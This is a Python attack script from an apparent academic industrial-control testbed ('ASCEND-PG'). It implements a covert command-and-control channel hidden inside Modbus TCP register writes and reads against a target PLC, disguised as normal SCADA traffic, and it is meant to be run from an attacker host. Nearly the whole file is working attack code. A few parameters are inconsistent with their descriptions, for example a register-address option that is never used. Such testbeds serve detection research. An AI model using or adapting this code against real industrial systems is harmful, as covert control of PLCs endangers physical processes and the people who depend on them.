#!/usr/bin/env python3
"""
ASCEND-PG attacks/standard_protocol_c2.py

MITRE ATT&CK for ICS: T0869 — Standard App Layer Protocol.

Embeds command-and-control (C2) payloads within standard Modbus TCP
packets. The attacker encodes C2 commands in register write values
(FC06) and reads responses from specific input registers. All traffic
appears as normal SCADA polling/writing.

This mimics sophisticated APT groups that hide C2 channels within
legitimate ICS protocol traffic.

PPO Parameters Used:
  - target_ip: PLC to use as C2 channel
  - register_address: Register address range for C2 commands (40100-40110)
  - value_magnitude: Encodes the command payload as a scaled value

Detection: Suricata detects suspicious register write patterns (SID 9000028).

Run this ON THE ATTACKER HOST:
    python3 attacks/standard_protocol_c2.py --target 10.0.0.1 --command DEAD

ACADEMIC USE ONLY — isolated testbed, no production systems.
"""

import argparse
import json
import struct
import time
from datetime import datetime, timezone
from pathlib import Path

from pymodbus.client import ModbusTcpClient

DEFAULT_LOG = Path(__file__).resolve().parent.parent / "data" / "log_store.json"
MODBUS_PORT = 502

# C2 register range: commands go to 40100-40109, responses from 30100-30109
C2_CMD_BASE = 40100
C2_RSP_BASE = 30100
C2_REGISTER_COUNT = 10


def log_event(log_path: Path, event: dict):
    """Append one event to the shared JSON log store."""
    event["timestamp"] = datetime.now(timezone.utc).isoformat()
    events = []
    if log_path.exists():
        try:
            events = json.loads(log_path.read_text())
        except json.JSONDecodeError:
            events = []
    events.append(event)
    log_path.write_text(json.dumps(events, indent=2))


def encode_command(command_hex: str) -> list:
    """Encode a hex command string into Modbus register values.

    Each register holds 16 bits, so a 4-char hex string (2 bytes) maps
    to one register. Longer commands use multiple registers.
    """
    values = []
    # Pad to even length
    if len(command_hex) % 2 != 0:
        command_hex = "0" + command_hex

    for i in range(0, len(command_hex), 2):
        byte_val = int(command_hex[i:i+2], 16)
        values.append(byte_val)

    # Pack pairs into 16-bit register values
    registers = []
    for i in range(0, len(values), 2):
        if i + 1 < len(values):
            reg_val = (values[i] << 8) | values[i+1]
        else:
            reg_val = values[i] << 8
        registers.append(reg_val)

    return registers


def decode_response(registers: list) -> str:
    """Decode Modbus register values back to hex string."""
    hex_str = ""
    for reg in registers:
        hex_str += f"{reg:04x}"
    return hex_str


def send_c2_command(client: ModbusTcpClient, command_hex: str,
                    log_path: Path) -> dict:
    """Send a C2 command via Modbus register writes and read response."""
    result = {
        "command": command_hex,
        "encoded_registers": [],
        "response_registers": [],
        "decoded_response": "",
    }

    # Encode command
    cmd_registers = encode_command(command_hex)
    result["encoded_registers"] = cmd_registers

    print(f"[c2] Encoding command '{command_hex}' -> registers {cmd_registers}")

    # Write command registers
    for i, value in enumerate(cmd_registers):
        addr = C2_CMD_BASE + i
        resp = client.write_register(addr, value, unit=1)
        if resp.isError():
            print(f"[c2] Write error at {addr}: {resp}")
            return result
        log_event(log_path, {
            "stage": "attack", "technique": "T0869",
            "action": "c2_write_command",
            "target": client.host,
            "register": addr,
            "value": value,
        })

    # Brief delay for PLC to process
    time.sleep(0.1)

    # Read response registers
    resp = client.read_input_registers(C2_RSP_BASE, C2_REGISTER_COUNT, unit=1)
    if not resp.isError():
        result["response_registers"] = resp.registers
        result["decoded_response"] = decode_response(resp.registers)
        print(f"[c2] Response registers: {resp.registers}")
        print(f"[c2] Decoded response: {result['decoded_response']}")

    return result


def run_c2_session(target_ip: str, command_hex: str, count: int,
                   interval: float, log_path: Path) -> dict:
    """Run a C2 session against the target PLC."""
    print(f"[c2] Starting C2 session with {target_ip}")
    print(f"[c2] Command: {command_hex}, count: {count}, interval: {interval}s")

    log_event(log_path, {
        "stage": "attack", "technique": "T0869",
        "action": "c2_session_start",
        "target": target_ip,
        "command": command_hex,
        "count": count,
    })

    client = ModbusTcpClient(target_ip, port=MODBUS_PORT, timeout=3)
    results = []

    try:
        if not client.connect():
            print(f"[c2] Cannot connect to {target_ip}")
            return {"results": [], "success": False}

        for i in range(count):
            result = send_c2_command(client, command_hex, log_path)
            results.append(result)

            if (i + 1) % 5 == 0:
                print(f"[c2] Progress: {i + 1}/{count}")

            if interval > 0:
                time.sleep(interval)

    except Exception as exc:
        print(f"[c2] Session error: {exc}")
    finally:
        client.close()

    success = len(results) > 0
    log_event(log_path, {
        "stage": "attack", "technique": "T0869",
        "action": "c2_session_end",
        "target": target_ip,
        "commands_sent": len(results),
        "success": success,
    })

    return {"results": results, "success": success}


def main():
    parser = argparse.ArgumentParser(
        description="ASCEND-PG Standard App Layer Protocol C2 (T0869) — "
                    "embed C2 commands in Modbus register values"
    )
    parser.add_argument("--target", required=True,
                        help="Target PLC IP")
    parser.add_argument("--command", default="DEAD",
                        help="Hex command to send (default: DEAD)")
    parser.add_argument("-a", "--register-address", type=int, default=40100,
                        help="C2 command register base (default: 40100)")
    parser.add_argument("-v", "--value-magnitude", type=float, default=1.0,
                        help="Command repetition multiplier (default: 1.0)")
    parser.add_argument("-c", "--count", type=int, default=5,
                        help="Number of C2 commands to send (default: 5)")
    parser.add_argument("-i", "--interval", type=float, default=1.0,
                        help="Interval between commands in seconds (default: 1.0)")
    parser.add_argument("--log", default=str(DEFAULT_LOG),
                        help="Path to the shared event log store")
    args = parser.parse_args()

    log_path = Path(args.log)
    log_path.parent.mkdir(parents=True, exist_ok=True)

    # Adjust count based on value_magnitude
    count = int(args.count * args.value_magnitude)

    run_c2_session(
        args.target, args.command, count,
        args.interval, log_path
    )

    print(f"\n[c2] Done")


if __name__ == "__main__":
    main()
